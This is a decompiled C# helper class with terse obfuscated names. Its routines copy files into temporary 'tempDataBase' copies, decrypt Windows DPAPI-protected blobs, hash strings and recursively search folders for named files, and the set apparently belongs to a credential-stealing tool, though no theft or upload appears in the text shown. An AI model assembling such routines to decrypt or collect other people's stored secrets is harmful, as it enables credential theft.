using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace NoiseMe.Drags.App.Data.Hlps
{
	// Token: 0x02000197 RID: 407
	public static class rcvr
	{
		// Token: 0x06000CD8 RID: 3288 RVA: 0x00029088 File Offset: 0x00027288
		public static string CreateTempCopy(string filePath)
		{
			string text = rcvr.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x06000CD9 RID: 3289 RVA: 0x000290A4 File Offset: 0x000272A4
		public static string CreateTempPath()
		{
			return Path.Combine(strg.TempDirectory, string.Concat(new object[]
			{
				"tempDataBase",
				DateTime.Now.ToString("O").Replace(':', '_'),
				Thread.CurrentThread.GetHashCode(),
				Thread.CurrentThread.ManagedThreadId
			}));
		}

		// Token: 0x06000CDA RID: 3290 RVA: 0x000099D8 File Offset: 0x00007BD8
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return rcvr.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
		}

		// Token: 0x06000CDB RID: 3291 RVA: 0x00016930 File Offset: 0x00014B30
		public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			string result;
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					result = string.Empty;
				}
				else
				{
					byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
					result = Encoding.UTF8.GetString(bytes);
				}
			}
			catch (CryptographicException)
			{
				result = string.Empty;
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000CDC RID: 3292 RVA: 0x000168BC File Offset: 0x00014ABC
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x06000CDD RID: 3293 RVA: 0x00029110 File Offset: 0x00027310
		public static string GetMd5Hash(string source)
		{
			HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(source);
			return rcvr.GetHexString(hashAlgorithm.ComputeHash(bytes));
		}

		// Token: 0x06000CDE RID: 3294 RVA: 0x000167F0 File Offset: 0x000149F0
		private static string GetHexString(IList<byte> bt)
		{
			string text = string.Empty;
			for (int i = 0; i < bt.Count; i++)
			{
				byte b = bt[i];
				int num = (int)(b & 15);
				int num2 = b >> 4 & 15;
				if (num2 > 9)
				{
					text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num2.ToString(CultureInfo.InvariantCulture);
				}
				if (num > 9)
				{
					text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num.ToString(CultureInfo.InvariantCulture);
				}
				if (i + 1 != bt.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		// Token: 0x06000CDF RID: 3295 RVA: 0x0002913C File Offset: 0x0002733C
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files == null || files.Length == 0 || level > maxLevel)
			{
				return list;
			}
			try
			{
				foreach (string path in Directory.GetDirectories(baseDirectory))
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						int num = 0;
						while (num < files2.Length && !flag)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in rcvr.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
